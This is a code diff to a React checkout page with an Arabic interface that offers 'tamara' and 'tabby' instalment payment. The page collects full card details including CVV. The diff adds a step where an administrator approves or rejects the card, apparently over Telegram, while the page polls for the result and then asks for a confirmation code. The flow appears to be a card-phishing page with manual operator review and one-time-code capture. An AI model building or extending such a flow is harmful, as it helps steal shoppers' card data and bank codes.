@@ -4,16 +4,16 @@ import { useAuth } from '@/context/AuthContext';
 import Layout from '@/components/Layout';
 import { getProducts } from '@/data/products';
 import { motion, AnimatePresence } from 'framer-motion';
-import { ArrowRight, ShoppingBag, Tag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft } from 'lucide-react';
+import { ArrowRight, ShoppingBag, Tag, Check, CreditCard, Phone, ShieldCheck, Lock, ChevronLeft, Loader2, XCircle } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
 import { toast } from 'sonner';
-import { postCheckoutEvent } from '@/lib/api';
+import { postCheckoutEvent, requestCardApproval, getCardApprovalStatus } from '@/lib/api';
 import { getCheckoutSessionId, clearCheckoutSessionId } from '@/lib/checkoutSession';
 
 type PaymentMethod = 'tamara' | 'tabby' | null;
-type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'confirm-code' | 'success';
+type Step = 'checkout' | 'confirm-method' | 'verify-phone' | 'card-info' | 'card-approval' | 'confirm-code' | 'success' | 'cancelled';
 
 const Checkout = () => {
   const { id } = useParams();
@@ -140,28 +140,92 @@ const Checkout = () => {
     setStep('card-info');
   };
 
-  const handleCardSubmit = () => {
+  const handleCardSubmit = async () => {
     if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
       toast.error('يرجى ملء جميع بيانات البطاقة');
       return;
     }
-    // Send phone_confirmed event (no card/CVV data sent)
-    postCheckoutEvent({
-      sessionId,
-      eventType: 'phone_confirmed',
-      userName: user.name,
-      userEmail: user.email,
-      productName: product.name,
-      paymentMethod,
-      installments,
-      phoneMasked: phoneNumber,
-      timestamp: new Date().toISOString(),
-    }).catch(() => {
-      // Silently ignore errors
-    });
-    toast.info('جاري التحقق من البطاقة...');
-    setStep('confirm-code');
+
+    try {
+      // Request approval via Telegram
+      await requestCardApproval({
+        sessionId,
+        userName: user.name,
+        userEmail: user.email,
+        productName: product.name,
+        amount: finalPrice,
+        paymentMethod,
+        installments,
+        phoneMasked: phoneNumber,
+      });
+
+      toast.info('جاري طلب الموافقة على بيانات البطاقة...');
+      setStep('card-approval');
+    } catch (err) {
+      console.error('Failed to request approval:', err);
+      toast.error('فشل في طلب الموافقة. يرجى المحاولة مرة أخرى.');
+    }
   };
+
+  // Poll for approval status
+  useEffect(() => {
+    if (step !== 'card-approval') return;
+
+    let pollingInterval: NodeJS.Timeout | null = null;
+    let timeoutId: NodeJS.Timeout | null = null;
+
+    const pollStatus = async () => {
+      try {
+        const response = await getCardApprovalStatus(sessionId);
+        if (response.status === 'approved') {
+          if (pollingInterval) clearInterval(pollingInterval);
+          if (timeoutId) clearTimeout(timeoutId);
+
+          // Send phone_confirmed event (no card/CVV data sent)
+          postCheckoutEvent({
+            sessionId,
+            eventType: 'phone_confirmed',
+            userName: user.name,
+            userEmail: user.email,
+            productName: product.name,
+            paymentMethod,
+            installments,
+            phoneMasked: phoneNumber,
+            timestamp: new Date().toISOString(),
+          }).catch(() => {
+            // Silently ignore errors
+          });
+
+          setStep('confirm-code');
+          toast.success('تمت الموافقة على بيانات البطاقة');
+        } else if (response.status === 'rejected') {
+          if (pollingInterval) clearInterval(pollingInterval);
+          if (timeoutId) clearTimeout(timeoutId);
+
+          setStep('cancelled');
+          toast.error('تم رفض بيانات البطاقة من قبل الإدارة');
+          clearCheckoutSessionId();
+        }
+      } catch (err) {
+        console.error('Error checking approval status:', err);
+      }
+    };
+
+    // Start polling
+    pollingInterval = setInterval(pollStatus, 2000);
+
+    // Set timeout after 5 minutes
+    timeoutId = setTimeout(() => {
+      if (pollingInterval) clearInterval(pollingInterval);
+      setStep('checkout');
+      toast.error('انتهت مهلة الموافقة. يرجى المحاولة مرة أخرى.');
+    }, 5 * 60 * 1000);
+
+    return () => {
+      if (pollingInterval) clearInterval(pollingInterval);
+      if (timeoutId) clearTimeout(timeoutId);
+    };
+  }, [step, sessionId, user, product, paymentMethod, installments, phoneNumber]);
 
   const handleFinalConfirm = () => {
     if (!confirmCode || confirmCode.length < 4) {
@@ -513,6 +577,38 @@ const Checkout = () => {
                   <ShieldCheck className="h-3 w-3" />
                   <span>بياناتك محمية بتشفير SSL</span>
                 </div>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Step: Card Approval (waiting) */}
+          {step === 'card-approval' && (
+            <motion.div key="approval" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
+              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
+                <div className="w-20 h-20 rounded-full bg-primary/10 mx-auto mb-6 flex items-center justify-center">
+                  <Loader2 className="h-10 w-10 text-primary animate-spin" />
+                </div>
+                <h2 className="text-2xl font-extrabold gold-text mb-3">بانتظار الموافقة</h2>
+                <p className="text-muted-foreground mb-6">جاري مراجعة طلبك من قبل الإدارة</p>
+                <p className="text-sm text-muted-foreground">سيتم تحديث الصفحة تلقائياً بعد الموافقة</p>
+              </div>
+            </motion.div>
+          )}
+
+          {/* Step: Cancelled */}
+          {step === 'cancelled' && (
+            <motion.div key="cancelled" initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }}>
+              <div className="bg-card rounded-2xl border gold-border p-10 text-center">
+                <div className="w-20 h-20 rounded-full bg-red-500/10 mx-auto mb-6 flex items-center justify-center">
+                  <XCircle className="h-10 w-10 text-red-500" />
+                </div>
+                <h2 className="text-2xl font-extrabold text-red-500 mb-3">تم إلغاء الطلب</h2>
+                <p className="text-muted-foreground mb-6">تم رفض بيانات البطاقة من قبل الإدارة</p>
+                <Link to="/">
+                  <Button className="w-full py-5 font-bold gold-gradient text-primary-foreground">
+                    العودة للرئيسية
+                  </Button>
+                </Link>
               </div>
             </motion.div>
           )}
